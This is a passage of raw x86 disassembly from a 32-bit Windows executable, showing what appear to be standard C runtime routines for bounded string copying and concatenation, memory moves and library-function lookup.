  407b66:	je     0x407b6d
  407b68:	cmp    ebx,0x4
  407b6b:	jne    0x407b88
  407b6d:	mov    ecx,DWORD PTR [edi+0x60]
  407b70:	mov    DWORD PTR [ebp-0x2c],ecx
  407b73:	mov    DWORD PTR [edi+0x60],eax
  407b76:	cmp    ebx,0x8
  407b79:	jne    0x407bbb
  407b7b:	mov    ecx,DWORD PTR [edi+0x64]
  407b7e:	mov    DWORD PTR [ebp-0x30],ecx
  407b81:	mov    DWORD PTR [edi+0x64],0x8c
  407b88:	cmp    ebx,0x8
  407b8b:	jne    0x407bbb
  407b8d:	mov    ecx,DWORD PTR ds:0x40e240
  407b93:	mov    DWORD PTR [ebp-0x24],ecx
  407b96:	mov    ecx,DWORD PTR ds:0x40e244
  407b9c:	mov    edx,DWORD PTR ds:0x40e240
  407ba2:	add    ecx,edx
  407ba4:	cmp    DWORD PTR [ebp-0x24],ecx
  407ba7:	jge    0x407bc2
  407ba9:	mov    ecx,DWORD PTR [ebp-0x24]
  407bac:	imul   ecx,ecx,0xc
  407baf:	mov    edx,DWORD PTR [edi+0x5c]
  407bb2:	mov    DWORD PTR [ecx+edx*1+0x8],eax
  407bb6:	inc    DWORD PTR [ebp-0x24]
  407bb9:	jmp    0x407b96
  407bbb:	call   0x403616
  407bc0:	mov    DWORD PTR [esi],eax
  407bc2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407bc9:	call   0x407be3
  407bce:	cmp    ebx,0x8
  407bd1:	jne    0x407bf2
  407bd3:	push   DWORD PTR [edi+0x64]
  407bd6:	push   ebx
  407bd7:	call   DWORD PTR [ebp-0x20]
  407bda:	pop    ecx
  407bdb:	jmp    0x407bf6
  407bdd:	mov    ebx,DWORD PTR [ebp+0x8]
  407be0:	mov    edi,DWORD PTR [ebp-0x28]
  407be3:	cmp    DWORD PTR [ebp-0x1c],0x0
  407be7:	je     0x407bf1
  407be9:	push   0x0
  407beb:	call   0x406624
  407bf0:	pop    ecx
  407bf1:	ret    
  407bf2:	push   ebx
  407bf3:	call   DWORD PTR [ebp-0x20]
  407bf6:	pop    ecx
  407bf7:	cmp    ebx,0x8
  407bfa:	je     0x407c06
  407bfc:	cmp    ebx,0xb
  407bff:	je     0x407c06
  407c01:	cmp    ebx,0x4
  407c04:	jne    0x407c17
  407c06:	mov    eax,DWORD PTR [ebp-0x2c]
  407c09:	mov    DWORD PTR [edi+0x60],eax
  407c0c:	cmp    ebx,0x8
  407c0f:	jne    0x407c17
  407c11:	mov    eax,DWORD PTR [ebp-0x30]
  407c14:	mov    DWORD PTR [edi+0x64],eax
  407c17:	xor    eax,eax
  407c19:	call   0x403bb9
  407c1e:	ret    
  407c1f:	mov    edi,edi
  407c21:	push   ebp
  407c22:	mov    ebp,esp
  407c24:	mov    eax,DWORD PTR [ebp+0x8]
  407c27:	mov    ds:0x40f96c,eax
  407c2c:	pop    ebp
  407c2d:	ret    
  407c2e:	mov    edi,edi
  407c30:	push   ebp
  407c31:	mov    ebp,esp
  407c33:	mov    eax,DWORD PTR [ebp+0x8]
  407c36:	mov    ds:0x40f978,eax
  407c3b:	pop    ebp
  407c3c:	ret    
  407c3d:	mov    edi,edi
  407c3f:	push   ebp
  407c40:	mov    ebp,esp
  407c42:	mov    eax,DWORD PTR [ebp+0x8]
  407c45:	mov    ds:0x40f97c,eax
  407c4a:	pop    ebp
  407c4b:	ret    
  407c4c:	push   0x10
  407c4e:	push   0x40c998
  407c53:	call   0x403b74
  407c58:	and    DWORD PTR [ebp-0x4],0x0
  407c5c:	push   DWORD PTR [ebp+0xc]
  407c5f:	push   DWORD PTR [ebp+0x8]
  407c62:	call   DWORD PTR ds:0x40b064
  407c68:	mov    DWORD PTR [ebp-0x1c],eax
  407c6b:	jmp    0x407c9c
  407c6d:	mov    eax,DWORD PTR [ebp-0x14]
  407c70:	mov    eax,DWORD PTR [eax]
  407c72:	mov    eax,DWORD PTR [eax]
  407c74:	mov    DWORD PTR [ebp-0x20],eax
  407c77:	xor    ecx,ecx
  407c79:	cmp    eax,0xc0000017
  407c7e:	sete   cl
  407c81:	mov    eax,ecx
  407c83:	ret    
  407c84:	mov    esp,DWORD PTR [ebp-0x18]
  407c87:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  407c8e:	jne    0x407c98
  407c90:	push   0x8
  407c92:	call   DWORD PTR ds:0x40b0fc
  407c98:	and    DWORD PTR [ebp-0x1c],0x0
  407c9c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407ca3:	mov    eax,DWORD PTR [ebp-0x1c]
  407ca6:	call   0x403bb9
  407cab:	ret    
  407cac:	mov    edi,edi
  407cae:	push   ebp
  407caf:	mov    ebp,esp
  407cb1:	mov    eax,DWORD PTR [ebp+0x8]
  407cb4:	mov    ds:0x40f980,eax
  407cb9:	pop    ebp
  407cba:	ret    
  407cbb:	mov    edi,edi
  407cbd:	push   ebp
  407cbe:	mov    ebp,esp
  407cc0:	push   DWORD PTR ds:0x40f980
  407cc6:	call   0x40361f
  407ccb:	pop    ecx
  407ccc:	test   eax,eax
  407cce:	je     0x407cdf
  407cd0:	push   DWORD PTR [ebp+0x8]
  407cd3:	call   eax
  407cd5:	pop    ecx
  407cd6:	test   eax,eax
  407cd8:	je     0x407cdf
  407cda:	xor    eax,eax
  407cdc:	inc    eax
  407cdd:	pop    ebp
  407cde:	ret    
  407cdf:	xor    eax,eax
  407ce1:	pop    ebp
  407ce2:	ret    
  407ce3:	mov    edi,edi
  407ce5:	push   ebp
  407ce6:	mov    ebp,esp
  407ce8:	sub    esp,0x14
  407ceb:	push   ebx
  407cec:	push   esi
  407ced:	push   edi
  407cee:	call   0x403616
  407cf3:	and    DWORD PTR [ebp-0x4],0x0
  407cf7:	cmp    DWORD PTR ds:0x40f984,0x0
  407cfe:	mov    ebx,eax
  407d00:	jne    0x407d94
  407d06:	push   0x40bab0
  407d0b:	call   DWORD PTR ds:0x40b088
  407d11:	mov    edi,eax
  407d13:	test   edi,edi
  407d15:	je     0x407e45
  407d1b:	mov    esi,DWORD PTR ds:0x40b084
  407d21:	push   0x40baa4
  407d26:	push   edi
  407d27:	call   esi
  407d29:	test   eax,eax
  407d2b:	je     0x407e45
  407d31:	push   eax
  407d32:	call   0x4035a4
  407d37:	mov    DWORD PTR [esp],0x40ba94
  407d3e:	push   edi
  407d3f:	mov    ds:0x40f984,eax
  407d44:	call   esi
  407d46:	push   eax
  407d47:	call   0x4035a4
  407d4c:	mov    DWORD PTR [esp],0x40ba80
  407d53:	push   edi
  407d54:	mov    ds:0x40f988,eax
  407d59:	call   esi
  407d5b:	push   eax
  407d5c:	call   0x4035a4
  407d61:	mov    DWORD PTR [esp],0x40ba64
  407d68:	push   edi
  407d69:	mov    ds:0x40f98c,eax
  407d6e:	call   esi
  407d70:	push   eax
  407d71:	call   0x4035a4
  407d76:	pop    ecx
  407d77:	mov    ds:0x40f994,eax
  407d7c:	test   eax,eax
  407d7e:	je     0x407d94
  407d80:	push   0x40ba4c
  407d85:	push   edi
  407d86:	call   esi
  407d88:	push   eax
  407d89:	call   0x4035a4
  407d8e:	pop    ecx
  407d8f:	mov    ds:0x40f990,eax
  407d94:	mov    eax,ds:0x40f990
  407d99:	cmp    eax,ebx
  407d9b:	je     0x407dec
  407d9d:	cmp    DWORD PTR ds:0x40f994,ebx
  407da3:	je     0x407dec
  407da5:	push   eax
  407da6:	call   0x40361f
  407dab:	push   DWORD PTR ds:0x40f994
  407db1:	mov    esi,eax
  407db3:	call   0x40361f
  407db8:	pop    ecx
  407db9:	pop    ecx
  407dba:	mov    edi,eax
  407dbc:	test   esi,esi
  407dbe:	je     0x407dec
  407dc0:	test   edi,edi
  407dc2:	je     0x407dec
  407dc4:	call   esi
  407dc6:	test   eax,eax
  407dc8:	je     0x407de3
  407dca:	lea    ecx,[ebp-0x8]
  407dcd:	push   ecx
  407dce:	push   0xc
  407dd0:	lea    ecx,[ebp-0x14]
  407dd3:	push   ecx
  407dd4:	push   0x1
  407dd6:	push   eax
  407dd7:	call   edi
  407dd9:	test   eax,eax
  407ddb:	je     0x407de3
  407ddd:	test   BYTE PTR [ebp-0xc],0x1
  407de1:	jne    0x407dec
  407de3:	or     DWORD PTR [ebp+0x10],0x200000
  407dea:	jmp    0x407e25
  407dec:	mov    eax,ds:0x40f988
  407df1:	cmp    eax,ebx
  407df3:	je     0x407e25
  407df5:	push   eax
  407df6:	call   0x40361f
  407dfb:	pop    ecx
  407dfc:	test   eax,eax
  407dfe:	je     0x407e25
  407e00:	call   eax
  407e02:	mov    DWORD PTR [ebp-0x4],eax
  407e05:	test   eax,eax
  407e07:	je     0x407e25
  407e09:	mov    eax,ds:0x40f98c
  407e0e:	cmp    eax,ebx
  407e10:	je     0x407e25
  407e12:	push   eax
  407e13:	call   0x40361f
  407e18:	pop    ecx
  407e19:	test   eax,eax
  407e1b:	je     0x407e25
  407e1d:	push   DWORD PTR [ebp-0x4]
  407e20:	call   eax
  407e22:	mov    DWORD PTR [ebp-0x4],eax
  407e25:	push   DWORD PTR ds:0x40f984
  407e2b:	call   0x40361f
  407e30:	pop    ecx
  407e31:	test   eax,eax
  407e33:	je     0x407e45
  407e35:	push   DWORD PTR [ebp+0x10]
  407e38:	push   DWORD PTR [ebp+0xc]
  407e3b:	push   DWORD PTR [ebp+0x8]
  407e3e:	push   DWORD PTR [ebp-0x4]
  407e41:	call   eax
  407e43:	jmp    0x407e47
  407e45:	xor    eax,eax
  407e47:	pop    edi
  407e48:	pop    esi
  407e49:	pop    ebx
  407e4a:	leave  
  407e4b:	ret    
  407e4c:	mov    edi,edi
  407e4e:	push   ebp
  407e4f:	mov    ebp,esp
  407e51:	mov    eax,DWORD PTR [ebp+0x8]
  407e54:	push   ebx
  407e55:	xor    ebx,ebx
  407e57:	push   esi
  407e58:	push   edi
  407e59:	cmp    eax,ebx
  407e5b:	je     0x407e64
  407e5d:	mov    edi,DWORD PTR [ebp+0xc]
  407e60:	cmp    edi,ebx
  407e62:	ja     0x407e7f
  407e64:	call   0x4024b6
  407e69:	push   0x16
  407e6b:	pop    esi
  407e6c:	mov    DWORD PTR [eax],esi
  407e6e:	push   ebx
  407e6f:	push   ebx
  407e70:	push   ebx
  407e71:	push   ebx
  407e72:	push   ebx
  407e73:	call   0x40244e
  407e78:	add    esp,0x14
  407e7b:	mov    eax,esi
  407e7d:	jmp    0x407ebb
  407e7f:	mov    esi,DWORD PTR [ebp+0x10]
  407e82:	cmp    esi,ebx
  407e84:	jne    0x407e8a
  407e86:	mov    BYTE PTR [eax],bl
  407e88:	jmp    0x407e64
  407e8a:	mov    edx,eax
  407e8c:	cmp    BYTE PTR [edx],bl
  407e8e:	je     0x407e94
  407e90:	inc    edx
  407e91:	dec    edi
  407e92:	jne    0x407e8c
  407e94:	cmp    edi,ebx
  407e96:	je     0x407e86
  407e98:	mov    cl,BYTE PTR [esi]
  407e9a:	mov    BYTE PTR [edx],cl
  407e9c:	inc    edx
  407e9d:	inc    esi
  407e9e:	cmp    cl,bl
  407ea0:	je     0x407ea5
  407ea2:	dec    edi
  407ea3:	jne    0x407e98
  407ea5:	cmp    edi,ebx
  407ea7:	jne    0x407eb9
  407ea9:	mov    BYTE PTR [eax],bl
  407eab:	call   0x4024b6
  407eb0:	push   0x22
  407eb2:	pop    ecx
  407eb3:	mov    DWORD PTR [eax],ecx
  407eb5:	mov    esi,ecx
  407eb7:	jmp    0x407e6e
  407eb9:	xor    eax,eax
  407ebb:	pop    edi
  407ebc:	pop    esi
  407ebd:	pop    ebx
  407ebe:	pop    ebp
  407ebf:	ret    
  407ec0:	mov    edi,edi
  407ec2:	push   ebp
  407ec3:	mov    ebp,esp
  407ec5:	push   ebx
  407ec6:	push   esi
  407ec7:	mov    esi,DWORD PTR [ebp+0x8]
  407eca:	xor    ebx,ebx
  407ecc:	push   edi
  407ecd:	cmp    DWORD PTR [ebp+0x14],ebx
  407ed0:	jne    0x407ee2
  407ed2:	cmp    esi,ebx
  407ed4:	jne    0x407ee6
  407ed6:	cmp    DWORD PTR [ebp+0xc],ebx
  407ed9:	jne    0x407eed
  407edb:	xor    eax,eax
  407edd:	pop    edi
  407ede:	pop    esi
  407edf:	pop    ebx
  407ee0:	pop    ebp
  407ee1:	ret    
  407ee2:	cmp    esi,ebx
  407ee4:	je     0x407eed
  407ee6:	mov    edi,DWORD PTR [ebp+0xc]
  407ee9:	cmp    edi,ebx
  407eeb:	ja     0x407f08
  407eed:	call   0x4024b6
  407ef2:	push   0x16
  407ef4:	pop    esi
  407ef5:	mov    DWORD PTR [eax],esi
  407ef7:	push   ebx
  407ef8:	push   ebx
  407ef9:	push   ebx
  407efa:	push   ebx
  407efb:	push   ebx
  407efc:	call   0x40244e
  407f01:	add    esp,0x14
  407f04:	mov    eax,esi
  407f06:	jmp    0x407edd
  407f08:	cmp    DWORD PTR [ebp+0x14],ebx
  407f0b:	jne    0x407f11
  407f0d:	mov    BYTE PTR [esi],bl
  407f0f:	jmp    0x407edb
  407f11:	mov    edx,DWORD PTR [ebp+0x10]
  407f14:	cmp    edx,ebx
  407f16:	jne    0x407f1c
  407f18:	mov    BYTE PTR [esi],bl
  407f1a:	jmp    0x407eed
  407f1c:	cmp    DWORD PTR [ebp+0x14],0xffffffff
  407f20:	mov    eax,esi
  407f22:	jne    0x407f33
  407f24:	mov    cl,BYTE PTR [edx]
  407f26:	mov    BYTE PTR [eax],cl
  407f28:	inc    eax
  407f29:	inc    edx
  407f2a:	cmp    cl,bl
  407f2c:	je     0x407f4c
  407f2e:	dec    edi
  407f2f:	jne    0x407f24
  407f31:	jmp    0x407f4c
  407f33:	mov    cl,BYTE PTR [edx]
  407f35:	mov    BYTE PTR [eax],cl
  407f37:	inc    eax
  407f38:	inc    edx
  407f39:	cmp    cl,bl
  407f3b:	je     0x407f45
  407f3d:	dec    edi
  407f3e:	je     0x407f45
  407f40:	dec    DWORD PTR [ebp+0x14]
  407f43:	jne    0x407f33
  407f45:	cmp    DWORD PTR [ebp+0x14],ebx
  407f48:	jne    0x407f4c
  407f4a:	mov    BYTE PTR [eax],bl
  407f4c:	cmp    edi,ebx
  407f4e:	jne    0x407edb
  407f50:	cmp    DWORD PTR [ebp+0x14],0xffffffff
  407f54:	jne    0x407f65
  407f56:	mov    eax,DWORD PTR [ebp+0xc]
  407f59:	push   0x50
  407f5b:	mov    BYTE PTR [esi+eax*1-0x1],bl
  407f5f:	pop    eax
  407f60:	jmp    0x407edd
  407f65:	mov    BYTE PTR [esi],bl
  407f67:	call   0x4024b6
  407f6c:	push   0x22
  407f6e:	pop    ecx
  407f6f:	mov    DWORD PTR [eax],ecx
  407f71:	mov    esi,ecx
  407f73:	jmp    0x407ef7
  407f75:	mov    edi,edi
  407f77:	push   ebp
  407f78:	mov    ebp,esp
  407f7a:	mov    ecx,DWORD PTR [ebp+0x8]
  407f7d:	push   ebx
  407f7e:	xor    ebx,ebx
  407f80:	push   esi
  407f81:	push   edi
  407f82:	cmp    ecx,ebx
  407f84:	je     0x407f8d
  407f86:	mov    edi,DWORD PTR [ebp+0xc]
  407f89:	cmp    edi,ebx
  407f8b:	ja     0x407fa8
  407f8d:	call   0x4024b6
  407f92:	push   0x16
  407f94:	pop    esi
  407f95:	mov    DWORD PTR [eax],esi
  407f97:	push   ebx
  407f98:	push   ebx
  407f99:	push   ebx
  407f9a:	push   ebx
  407f9b:	push   ebx
  407f9c:	call   0x40244e
  407fa1:	add    esp,0x14
  407fa4:	mov    eax,esi
  407fa6:	jmp    0x407fd8
  407fa8:	mov    esi,DWORD PTR [ebp+0x10]
  407fab:	cmp    esi,ebx
  407fad:	jne    0x407fb3
  407faf:	mov    BYTE PTR [ecx],bl
  407fb1:	jmp    0x407f8d
  407fb3:	mov    edx,ecx
  407fb5:	mov    al,BYTE PTR [esi]
  407fb7:	mov    BYTE PTR [edx],al
  407fb9:	inc    edx
  407fba:	inc    esi
  407fbb:	cmp    al,bl
  407fbd:	je     0x407fc2
  407fbf:	dec    edi
  407fc0:	jne    0x407fb5
  407fc2:	cmp    edi,ebx
  407fc4:	jne    0x407fd6
  407fc6:	mov    BYTE PTR [ecx],bl
  407fc8:	call   0x4024b6
  407fcd:	push   0x22
  407fcf:	pop    ecx
  407fd0:	mov    DWORD PTR [eax],ecx
  407fd2:	mov    esi,ecx
  407fd4:	jmp    0x407f97
  407fd6:	xor    eax,eax
  407fd8:	pop    edi
  407fd9:	pop    esi
  407fda:	pop    ebx
  407fdb:	pop    ebp
  407fdc:	ret    
  407fdd:	int3   
  407fde:	int3   
  407fdf:	mov    edi,edi
  407fe1:	push   ebp
  407fe2:	mov    ebp,esp
  407fe4:	mov    ecx,DWORD PTR [ebp+0x8]
  407fe7:	push   esi
  407fe8:	xor    esi,esi
  407fea:	cmp    ecx,esi
  407fec:	jl     0x40800c
  407fee:	cmp    ecx,0x2
  407ff1:	jle    0x407fff
  407ff3:	cmp    ecx,0x3
  407ff6:	jne    0x40800c
  407ff8:	mov    eax,ds:0x40ef18
  407ffd:	jmp    0x408027
  407fff:	mov    eax,ds:0x40ef18
  408004:	mov    DWORD PTR ds:0x40ef18,ecx
  40800a:	jmp    0x408027
  40800c:	call   0x4024b6
  408011:	push   esi
  408012:	push   esi
  408013:	push   esi
  408014:	push   esi
  408015:	push   esi
  408016:	mov    DWORD PTR [eax],0x16
  40801c:	call   0x40244e
  408021:	add    esp,0x14
  408024:	or     eax,0xffffffff
  408027:	pop    esi
  408028:	pop    ebp
  408029:	ret    
  40802a:	mov    edi,edi
  40802c:	push   ebp
  40802d:	mov    ebp,esp
  40802f:	mov    edx,DWORD PTR [ebp+0x8]
  408032:	push   ebx
  408033:	push   esi
  408034:	push   edi
  408035:	xor    edi,edi
  408037:	cmp    edx,edi
  408039:	je     0x408042
  40803b:	mov    ebx,DWORD PTR [ebp+0xc]
  40803e:	cmp    ebx,edi
  408040:	ja     0x408060
  408042:	call   0x4024b6
  408047:	push   0x16
  408049:	pop    esi
  40804a:	mov    DWORD PTR [eax],esi
  40804c:	push   edi
  40804d:	push   edi
  40804e:	push   edi
  40804f:	push   edi
  408050:	push   edi
  408051:	call   0x40244e
  408056:	add    esp,0x14
  408059:	mov    eax,esi
  40805b:	pop    edi
  40805c:	pop    esi
  40805d:	pop    ebx
  40805e:	pop    ebp
  40805f:	ret    
  408060:	mov    esi,DWORD PTR [ebp+0x10]
  408063:	cmp    esi,edi
  408065:	jne    0x40806e
  408067:	xor    eax,eax
  408069:	mov    WORD PTR [edx],ax
  40806c:	jmp    0x408042
  40806e:	mov    ecx,edx
  408070:	movzx  eax,WORD PTR [esi]
  408073:	mov    WORD PTR [ecx],ax
  408076:	inc    ecx
  408077:	inc    ecx
  408078:	inc    esi
  408079:	inc    esi
  40807a:	cmp    ax,di
  40807d:	je     0x408082
  40807f:	dec    ebx
  408080:	jne    0x408070
  408082:	xor    eax,eax
  408084:	cmp    ebx,edi
  408086:	jne    0x40805b
  408088:	mov    WORD PTR [edx],ax
  40808b:	call   0x4024b6
  408090:	push   0x22
  408092:	pop    ecx
  408093:	mov    DWORD PTR [eax],ecx
  408095:	mov    esi,ecx
  408097:	jmp    0x40804c
  408099:	mov    edi,edi
  40809b:	push   ebp
  40809c:	mov    ebp,esp
  40809e:	mov    eax,DWORD PTR [ebp+0x8]
  4080a1:	mov    cx,WORD PTR [eax]
  4080a4:	inc    eax
  4080a5:	inc    eax
  4080a6:	test   cx,cx
  4080a9:	jne    0x4080a1
  4080ab:	sub    eax,DWORD PTR [ebp+0x8]
  4080ae:	sar    eax,1
  4080b0:	dec    eax
  4080b1:	pop    ebp
  4080b2:	ret    
  4080b3:	int3   
  4080b4:	int3   
  4080b5:	int3   
  4080b6:	int3   
  4080b7:	int3   
  4080b8:	int3   
  4080b9:	int3   
  4080ba:	int3   
  4080bb:	int3   
  4080bc:	int3   
  4080bd:	int3   
  4080be:	int3   
  4080bf:	int3   
  4080c0:	push   ebp
  4080c1:	mov    ebp,esp
  4080c3:	push   edi
  4080c4:	push   esi
  4080c5:	mov    esi,DWORD PTR [ebp+0xc]
  4080c8:	mov    ecx,DWORD PTR [ebp+0x10]
  4080cb:	mov    edi,DWORD PTR [ebp+0x8]
  4080ce:	mov    eax,ecx
  4080d0:	mov    edx,ecx
  4080d2:	add    eax,esi
  4080d4:	cmp    edi,esi
  4080d6:	jbe    0x4080e0
  4080d8:	cmp    edi,eax
  4080da:	jb     0x408284
  4080e0:	cmp    ecx,0x100
  4080e6:	jb     0x408107
  4080e8:	cmp    DWORD PTR ds:0x411408,0x0
  4080ef:	je     0x408107
  4080f1:	push   edi
  4080f2:	push   esi
  4080f3:	and    edi,0xf
  4080f6:	and    esi,0xf
  4080f9:	cmp    edi,esi
  4080fb:	pop    esi
  4080fc:	pop    edi
  4080fd:	jne    0x408107
  4080ff:	pop    esi
  408100:	pop    edi
  408101:	pop    ebp
  408102:	jmp    0x409e94
  408107:	test   edi,0x3
  40810d:	jne    0x408124
  40810f:	shr    ecx,0x2
  408112:	and    edx,0x3
  408115:	cmp    ecx,0x8
  408118:	jb     0x408144
  40811a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40811c:	jmp    DWORD PTR [edx*4+0x408234]
  408123:	nop
  408124:	mov    eax,edi
  408126:	mov    edx,0x3
  40812b:	sub    ecx,0x4
  40812e:	jb     0x40813c
  408130:	and    eax,0x3
  408133:	add    ecx,eax
  408135:	jmp    DWORD PTR [eax*4+0x408148]
  40813c:	jmp    DWORD PTR [ecx*4+0x408244]
  408143:	nop
  408144:	jmp    DWORD PTR [ecx*4+0x4081c8]
  40814b:	nop
  40814c:	pop    eax
  40814d:	add    DWORD PTR [eax+0x0],0x408184
  408154:	test   al,0x81
  408156:	inc    eax
  408157:	add    BYTE PTR [ebx],ah
  408159:	ror    DWORD PTR [edx-0x75f877fa],1
  40815f:	inc    esi
  408160:	add    DWORD PTR [eax+0x468a0147],ecx
  408166:	add    al,cl
  408168:	jmp    0x288096f
  40816d:	add    esi,0x3
  408170:	add    edi,0x3
  408173:	cmp    ecx,0x8
  408176:	jb     0x408144
  408178:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40817a:	jmp    DWORD PTR [edx*4+0x408234]
  408181:	lea    ecx,[ecx+0x0]
  408184:	and    edx,ecx
  408186:	mov    al,BYTE PTR [esi]
  408188:	mov    BYTE PTR [edi],al
  40818a:	mov    al,BYTE PTR [esi+0x1]
  40818d:	shr    ecx,0x2
  408190:	mov    BYTE PTR [edi+0x1],al
  408193:	add    esi,0x2
  408196:	add    edi,0x2
  408199:	cmp    ecx,0x8
  40819c:	jb     0x408144
  40819e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a0:	jmp    DWORD PTR [edx*4+0x408234]
  4081a7:	nop
  4081a8:	and    edx,ecx
  4081aa:	mov    al,BYTE PTR [esi]
  4081ac:	mov    BYTE PTR [edi],al
  4081ae:	add    esi,0x1
  4081b1:	shr    ecx,0x2
  4081b4:	add    edi,0x1
  4081b7:	cmp    ecx,0x8
  4081ba:	jb     0x408144
  4081bc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081be:	jmp    DWORD PTR [edx*4+0x408234]
  4081c5:	lea    ecx,[ecx+0x0]
  4081c8:	sub    eax,DWORD PTR [edx-0x7de7ffc0]
  4081ce:	inc    eax
  4081cf:	add    BYTE PTR [eax],dl
  4081d1:	add    BYTE PTR [eax+0x0],0x8
  4081d5:	add    BYTE PTR [eax+0x0],0x0
  4081d9:	add    BYTE PTR [eax+0x0],0xf8
  4081dd:	add    DWORD PTR [eax+0x0],0x4081f0
  4081e4:	call   0x8b40c26a
  4081e9:	inc    esp
  4081ea:	mov    fs,esp
  4081ec:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  4081f0:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  4081f4:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4081f8:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4081fc:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  408200:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  408204:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  408208:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  40820c:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  408210:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  408214:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  408218:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  40821c:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  408220:	lea    eax,[ecx*4+0x0]
  408227:	add    esi,eax
  408229:	add    edi,eax
  40822b:	jmp    DWORD PTR [edx*4+0x408234]
  408232:	mov    edi,edi
  408234:	inc    esp
  408235:	add    BYTE PTR [eax+0x0],0x4c
  408239:	add    BYTE PTR [eax+0x0],0x58
  40823d:	add    BYTE PTR [eax+0x0],0x6c
  408241:	add    BYTE PTR [eax+0x0],0x8b
  408245:	inc    ebp
  408246:	or     BYTE PTR [esi+0x5f],bl
  408249:	leave  
  40824a:	ret    
  40824b:	nop
  40824c:	mov    al,BYTE PTR [esi]
  40824e:	mov    BYTE PTR [edi],al
  408250:	mov    eax,DWORD PTR [ebp+0x8]
  408253:	pop    esi
  408254:	pop    edi
  408255:	leave  
  408256:	ret    
  408257:	nop
  408258:	mov    al,BYTE PTR [esi]
  40825a:	mov    BYTE PTR [edi],al
  40825c:	mov    al,BYTE PTR [esi+0x1]
  40825f:	mov    BYTE PTR [edi+0x1],al
  408262:	mov    eax,DWORD PTR [ebp+0x8]
  408265:	pop    esi
  408266:	pop    edi
  408267:	leave  
  408268:	ret    
  408269:	lea    ecx,[ecx+0x0]
  40826c:	mov    al,BYTE PTR [esi]
  40826e:	mov    BYTE PTR [edi],al
  408270:	mov    al,BYTE PTR [esi+0x1]
  408273:	mov    BYTE PTR [edi+0x1],al
  408276:	mov    al,BYTE PTR [esi+0x2]
  408279:	mov    BYTE PTR [edi+0x2],al
  40827c:	mov    eax,DWORD PTR [ebp+0x8]
  40827f:	pop    esi
  408280:	pop    edi
  408281:	leave  
  408282:	ret    
  408283:	nop
  408284:	lea    esi,[ecx+esi*1-0x4]
  408288:	lea    edi,[ecx+edi*1-0x4]
  40828c:	test   edi,0x3
  408292:	jne    0x4082b8
  408294:	shr    ecx,0x2
  408297:	and    edx,0x3
  40829a:	cmp    ecx,0x8
  40829d:	jb     0x4082ac
  40829f:	std    
  4082a0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082a2:	cld    
  4082a3:	jmp    DWORD PTR [edx*4+0x4083d0]
  4082aa:	mov    edi,edi
  4082ac:	neg    ecx
  4082ae:	jmp    DWORD PTR [ecx*4+0x408380]
  4082b5:	lea    ecx,[ecx+0x0]
  4082b8:	mov    eax,edi
  4082ba:	mov    edx,0x3
  4082bf:	cmp    ecx,0x4
  4082c2:	jb     0x4082d0
  4082c4:	and    eax,0x3
  4082c7:	sub    ecx,eax
  4082c9:	jmp    DWORD PTR [eax*4+0x4082d4]
  4082d0:	jmp    DWORD PTR [ecx*4+0x4083d0]
  4082d7:	nop
  4082d8:	in     al,0x82
  4082da:	inc    eax
  4082db:	add    BYTE PTR [eax],cl
  4082dd:	add    DWORD PTR [eax+0x0],0x30
  4082e1:	add    DWORD PTR [eax+0x0],0xffffff8a
  4082e5:	inc    esi
  4082e6:	add    esp,DWORD PTR [ebx]
  4082e8:	ror    DWORD PTR [eax-0x117cfcb9],1
  4082ee:	add    ecx,eax
  4082f0:	jmp    0x23005f7
  4082f5:	cmp    ecx,0x8
  4082f8:	jb     0x4082ac
  4082fa:	std    
  4082fb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082fd:	cld    
  4082fe:	jmp    DWORD PTR [edx*4+0x4083d0]
  408305:	lea    ecx,[ecx+0x0]
  408308:	mov    al,BYTE PTR [esi+0x3]
  40830b:	and    edx,ecx
  40830d:	mov    BYTE PTR [edi+0x3],al
  408310:	mov    al,BYTE PTR [esi+0x2]
  408313:	shr    ecx,0x2
  408316:	mov    BYTE PTR [edi+0x2],al
  408319:	sub    esi,0x2
  40831c:	sub    edi,0x2
  40831f:	cmp    ecx,0x8
  408322:	jb     0x4082ac
  408324:	std    
  408325:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408327:	cld    
  408328:	jmp    DWORD PTR [edx*4+0x4083d0]
  40832f:	nop
  408330:	mov    al,BYTE PTR [esi+0x3]
  408333:	and    edx,ecx
  408335:	mov    BYTE PTR [edi+0x3],al
  408338:	mov    al,BYTE PTR [esi+0x2]
  40833b:	mov    BYTE PTR [edi+0x2],al
  40833e:	mov    al,BYTE PTR [esi+0x1]
  408341:	shr    ecx,0x2
  408344:	mov    BYTE PTR [edi+0x1],al
  408347:	sub    esi,0x3
  40834a:	sub    edi,0x3
  40834d:	cmp    ecx,0x8
  408350:	jb     0x4082ac
  408356:	std    
  408357:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408359:	cld    
  40835a:	jmp    DWORD PTR [edx*4+0x4083d0]
  408361:	lea    ecx,[ecx+0x0]
  408364:	test   BYTE PTR [ebx-0x7c73ffc0],al
  40836a:	inc    eax
  40836b:	add    BYTE PTR [ebx+eax*4-0x7c63ffc0],dl
  408372:	inc    eax
  408373:	add    BYTE PTR [ebx+eax*4-0x7c53ffc0],ah
  40837a:	inc    eax
  40837b:	add    BYTE PTR [ebx+eax*4-0x7c38ffc0],dh
  408382:	inc    eax
  408383:	add    BYTE PTR [ebx-0x76e371bc],cl
  408389:	inc    esp
  40838a:	(bad)  
  40838b:	sbb    al,0x8b
